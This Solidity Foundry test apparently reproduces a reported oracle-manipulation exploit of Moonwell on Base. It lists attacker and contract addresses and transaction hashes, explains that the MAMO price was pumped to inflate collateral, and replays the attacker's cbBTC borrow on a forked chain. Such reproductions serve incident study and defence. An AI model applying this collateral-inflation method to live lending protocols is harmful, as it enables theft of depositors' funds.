// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// @KeyInfo - Total Lost : ~$8.7M–$10M (ExVul: ~71.36 cbBTC / ~$5.7M from mcbBTC alone; SlowMist ~$8.7M incl. stables/ETH)
// Attacker EOA (EIP-7702) : 0x719eae70d4A83f35bF82A2740699F5db84BE919D
// mcbBTC (borrow market)  : 0xF877ACaFA28c19b96727966690b2f44d35aD5976
// mMAMO (collateral)      : 0x2F90Bb22eB3979f5FfAd31EA6C3F0792ca66dA32
// MAMO underlying         : 0x7300B37DfdfAb110d83290A29DfB31B1740219fE
// ChainlinkOracle         : 0xEC942bE8A8114bFD0396A5052c36027f2cA6a9d0
// MAMO/USD feed (OEV)     : 0xDBD37C274A70A8A3f92A227c843a6a8d3203afe6
// Largest borrow tx       : 0xafb6f0fa257b115a5c813bf787b4c1535e63888b1d0dbeb1f3788f557f51798f (~14.34 cbBTC)
// First listed borrow     : 0x09687d741d92a2607a1d63014104bbad663347a79d7949d0f3073c84a395593e @ 50515423
// Alert                   : https://x.com/SlowMist_Team/status/2092949807912689915
//                           https://x.com/exvulsec/status/2092912846036402674
//
// Root cause: Moonwell listed thin-market MAMO as collateral and priced it via a
// ChainlinkOracle feed that tracked the manipulable MAMO/USD market. Attacker pumped
// MAMO ~$0.0105 → ~$0.088 (~8×), supplied mMAMO, then borrowed real assets (cbBTC,
// USDC, …) against the inflated collateral valuation.
//
// PoC: fork one block before the largest cbBTC borrow (price already inflated on-feed)
// and re-call mcbBTC.borrow as the historical attacker (collateral + markets already set).

address constant ATTACKER = 0x719eae70d4A83f35bF82A2740699F5db84BE919D;
address constant MCBBTC = 0xF877ACaFA28c19b96727966690b2f44d35aD5976;
address constant MMAMO = 0x2F90Bb22eB3979f5FfAd31EA6C3F0792ca66dA32;
address constant MAMO = 0x7300B37DfdfAb110d83290A29DfB31B1740219fE;
address constant CBBTC = 0xcbB7C0000aB88B473b1f5aFd9ef808440eed33Bf;
address constant ORACLE = 0xEC942bE8A8114bFD0396A5052c36027f2cA6a9d0;
address constant MAMO_FEED = 0xDBD37C274A70A8A3f92A227c843a6a8d3203afe6;
address constant COMPTROLLER = 0xfBb21d0380beE3312B33c4353c8936a0F13EF26C;
address constant USDC = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;

// Largest ExVul borrow mined in 50516532; first listed borrow was 50515423
uint256 constant FORK_BLOCK = 50_516_531;
// Historical execute([(mcbBTC, amount)]) payload amount (8 decimals)
uint256 constant BORROW_CBBTC = 1_433_812_576; // 14.33812576 cbBTC
uint256 constant EXPECTED_CBBTC = 1_433_812_576;

interface IMErc20 {
    function borrow(uint256 borrowAmount) external returns (uint256);
    function borrowBalanceStored(address account) external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function symbol() external view returns (string memory);
    function underlying() external view returns (address);
}

interface IChainlinkOracle {
    function getUnderlyingPrice(address mToken) external view returns (uint256);
    function getFeed(string calldata symbol) external view returns (address);
}

interface IAggregatorV3 {
    function latestRoundData()
        external
        view
        returns (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound);
    function decimals() external view returns (uint8);
    function description() external view returns (string memory);
}

contract MoonwellMamoOracleManipulation_exp is BaseTestWithBalanceLog {
    function setUp() public {
        // Prefer named foundry.toml endpoint; allow env override for archive RPCs.
        // Offline: anvil --load-state anvil_state.json --port 8548 --chain-id 8453
        //   then MOONWELL_MAMO_FORK_URL=http://127.0.0.1:8548 forge test
        string memory rpc = vm.envOr("MOONWELL_MAMO_FORK_URL", string(""));
        if (bytes(rpc).length == 0) {
            rpc = vm.envOr("BASE_RPC_URL", string(""));
        }
        if (bytes(rpc).length == 0) {
            rpc = "base";
        }
        vm.createSelectFork(rpc, FORK_BLOCK);

        fundingToken = CBBTC;
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker EOA (EIP-7702)");
        vm.label(MCBBTC, "mcbBTC");
        vm.label(MMAMO, "mMAMO");
        vm.label(MAMO, "MAMO");
        vm.label(CBBTC, "cbBTC");
        vm.label(ORACLE, "Moonwell ChainlinkOracle");
        vm.label(MAMO_FEED, "MAMO/USD feed");
        vm.label(COMPTROLLER, "Unitroller/Comptroller");
        vm.label(USDC, "USDC");
    }

    function testExploit() public balanceLog {
        uint256 price = IChainlinkOracle(ORACLE).getUnderlyingPrice(MMAMO);
        emit log_named_decimal_uint("Oracle MAMO underlying price (1e18)", price, 18);
        // Inflated ~8× vs ~$0.0105 pre-pump (1.054e16)
        require(price >= 8e16, "oracle not yet inflated");

        (, int256 answer,,,) = IAggregatorV3(MAMO_FEED).latestRoundData();
        emit log_named_int("MAMO/USD feed answer (8 decimals)", answer);

        uint256 mMamoBal = IMErc20(MMAMO).balanceOf(ATTACKER);
        emit log_named_decimal_uint("Attacker mMAMO collateral", mMamoBal, 8);

        uint256 before_ = IERC20(CBBTC).balanceOf(ATTACKER);

        // Historical path: EIP-7702 execute([(mcbBTC, BORROW_CBBTC)]). Direct borrow is equivalent.
        vm.startPrank(ATTACKER, ATTACKER);
        uint256 err = IMErc20(MCBBTC).borrow(BORROW_CBBTC);
        vm.stopPrank();
        require(err == 0, "borrow failed");

        uint256 profit = IERC20(CBBTC).balanceOf(ATTACKER) - before_;
        emit log_named_decimal_uint("Attacker cbBTC borrowed (profit)", profit, 8);
        require(profit >= EXPECTED_CBBTC, "cbBTC short");
    }
}
